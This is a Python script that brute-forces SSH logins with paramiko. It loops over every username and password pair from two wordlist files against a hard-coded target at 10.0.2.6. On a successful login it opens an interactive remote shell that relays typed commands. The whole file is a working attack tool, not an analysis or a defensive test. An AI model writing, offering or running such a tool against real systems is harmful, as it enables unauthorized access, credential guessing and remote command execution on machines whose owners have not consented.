import paramiko
import time

def ssh_brute_force_and_login(host, port, user_file, pass_file):
    with open(user_file, 'r') as uf:
        usernames = [line.strip() for line in uf]

    with open(pass_file, 'r') as pf:
        passwords = [line.strip() for line in pf]

    for username in usernames:
        for password in passwords:
            print(f"Trying {username}:{password}")
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host, port=port, username=username, password=password, timeout=3)
                print(f"\n[+] Success! Logged in as {username}:{password}")


                shell = client.invoke_shell()
                print("Connected to the target. Type your commands below.\n(Type 'exit' to quit)\n")

                while True:
                    cmd = input(f"{username}@{host}$ ")
                    if cmd.strip().lower() == "exit":
                        break
                    shell.send(cmd + '\n')
                    time.sleep(1)
                    output = shell.recv(4096).decode()
                    print(output)

                client.close()
                return
            except paramiko.AuthenticationException:
                pass
            except Exception as e:
                print(f"[!] Error: {e}")
                continue

    print("\n[-] No valid credentials found.")


if __name__ == "__main__":
    target_ip = "10.0.2.6"
    target_port = 22
    usernames_file = "usernames.txt"
    passwords_file = "passwords.txt"

    ssh_brute_force_and_login(target_ip, target_port, usernames_file, passwords_file)
